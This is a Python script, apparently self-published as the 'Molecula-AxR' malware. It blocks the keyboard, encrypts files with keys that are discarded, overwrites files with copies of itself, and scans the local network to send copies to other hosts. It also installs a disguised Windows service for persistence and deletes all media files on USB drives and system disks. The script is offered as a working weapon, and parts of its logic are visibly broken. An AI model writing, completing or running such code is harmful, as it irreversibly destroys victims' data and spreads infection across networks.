#Este Script llamado Molecula-AxR ha sido desarrollado por HeroGato

import os
import shutil
import random
import subprocess
import keyboard
import socket
import nmap
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def block_keys_permanently():
    def block_all_keys():
        return False

    keyboard.hook_key('', block_all_keys)
    print("All keys permanently blocked")

def generate_dynamic_key():
    return get_random_bytes(32)

def encrypt_file_with_dynamic_key(file_path):
    try:
        dynamic_key = generate_dynamic_key()
        with open(file_path, 'rb') as file:
            data = file.read()
        while len(data) % 16 != 0:
            data += b' '
        cipher = AES.new(dynamic_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        with open(file_path, 'wb') as file:
            for x in (cipher.nonce, tag, ciphertext):
                file.write(x)
        print("File encrypted with dynamic key:", file_path)
    except FileNotFoundError as e:
        print("File not found:", file_path)
    except PermissionError as e:
        print("Permission denied to access the file:", file_path)
    except Exception as e:
        print("Error encrypting file with dynamic key:", file_path, ":", e)

def encrypt_database_with_dynamic_key(db_path):
    try:
        dynamic_key = generate_dynamic_key()
        with open(db_path, 'rb') as file:
            data = file.read()
        while len(data) % 16 != 0:
            data += b' '
        cipher = AES.new(dynamic_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        with open(db_path, 'wb') as file:
            for x in (cipher.nonce, tag, ciphertext):
                file.write(x)
        print("Database encrypted with dynamic key:", db_path)
    except FileNotFoundError as e:
        print("Database not found:", db_path)
    except PermissionError as e:
        print("Permission denied to access the database:", db_path)
    except Exception as e:
        print("Error encrypting database with dynamic key:", db_path, ":", e)

def encrypt_all_files():
    for item in os.listdir(os.path.abspath(os.sep)):
        item_path = os.path.join(os.path.abspath(os.sep), item)
        if os.path.isfile(item_path):
            try:
                if item.endswith(('.py', '.xlsx', '.db')):
                    encrypt_file_with_dynamic_key(item_path)
                elif item.endswith(('.sqlite', '.db3')):
                    encrypt_database_with_dynamic_key(item_path)
            except Exception as e:
                print("Could not encrypt", item_path, ":", e)

def infect_system():
    for item in os.listdir(os.path.abspath(os.sep)):
        item_path = os.path.join(os.path.abspath(os.sep), item)
        if os.path.isfile(item_path):
            try:
                shutil.copy(__file__, item_path)
                if item.endswith(('.txt', '.docx', '.pdf', '.exe')):
                    with open(item_path, 'a') as infected_file:
                        infected_file.write("\n# Optional: Code executed by the malware upon opening the file")
                encrypt_file_with_dynamic_key(item_path)
                print("Infecting file:", item_path)
            except Exception as e:
                print("Could not infect", item_path, ":", e)

def replicate():
    network_hosts = scan_network_hosts()
    open_ports = scan_ports()

    malware_path = os.path.abspath(__file__)
    new_malware_name = generate_variant_name()

    for host, port in open_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            with open(os.path.join(malware_path, new_malware_name), 'rb') as malware_file:
                s.sendall(malware_file.read())
            s.close()
            print("Malware infiltrated:", host, "through port:", port)
            break
        except Exception as e:
            print("Error infiltrating device:", host, "-", e)

def establish_advanced_persistence(usb_drive, malware_name):
    try:
        service_name = f"Microsoft{random.randint(1000, 9999)}"
        service_exe_path = os.path.join(usb_drive, malware_name)
        subprocess.run(["sc", "create", service_name, "binPath=", service_exe_path, "type=", "own", "start=", "auto", "error=", "ignore"], shell=True)
        subprocess.run(["sc", "start", service_name], shell=True)
        print("Persistence operation completed on:", usb_drive)
    except Exception as e:
        print("Error establishing persistence:", e)

def delete_media_content():
    usb_drive = get_usb_drive()
    if usb_drive:
        for root, _, files in os.walk(usb_drive):  
            for file in files:
                file_path = os.path.join(root, file)
                if file.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.avi', '.mov', '.mp3', '.wav', '.flac')):
                    try:
                        os.remove(file_path)
                        print("File permanently deleted:", file_path)
                    except Exception as e:
                        print("Could not delete", file_path, ":", e)

    for root, _, files in os.walk(os.path.abspath(os.sep)):  
        for file in files:
            file_path = os.path.join(root, file)
            if file.endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.avi', '.mov', '.mp3', '.wav', '.flac')):
                try:
                    os.remove(file_path)
                    print("File permanently deleted:", file_path)
                except Exception as e:
                    print("Could not delete", file_path, ":", e)

def get_usb_drive():
    try:
        drives = [drive for drive in os.popen("wmic logicaldisk get caption").read().split()[1:] if 'Removable' in os.popen(f"fsutil fsinfo drivetype {drive}").read()]
        return drives[0] if drives else None
    except Exception as e:
        print("Error getting USB drive:", e)
        return None

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print("Error obtaining local IP address:", e)
        return None

def scan_ports():
    active_hosts = scan_network_hosts()
    open_ports = []

    for host in active_hosts:
        try:
            scanner = nmap.PortScanner()
            scanner.scan(hosts=host, arguments='-p 1-65535')
            for proto in scanner[host].all_protocols():
                ports = scanner[host][proto].keys()
                for port in ports:
                    if scanner[host][proto][port]['state'] == 'open':
                        open_ports.append((host, port))
        except Exception as e:
            print("Error scanning portson host:", host, "-", e)
            return open_ports

def generate_variant_name():
    base_names = ["explorer.exe", "svchost.exe", "taskmgr.exe", "lsass.exe", "services.exe"]
    random_suffix = ''.join(random.choices('0123456789', k=3))
    return random.choice(base_names) + "_" + random_suffix + ".exe"

if __name__ == "__main__":
    block_keys_permanently()
    try:
        encrypt_all_files()
        infect_system()
        replicate()
        usb_drive = get_usb_drive()
        if usb_drive:
            establish_advanced_persistence(usb_drive, "malware.exe")
        delete_media_content()
    except Exception as e:
        print("General error:", e)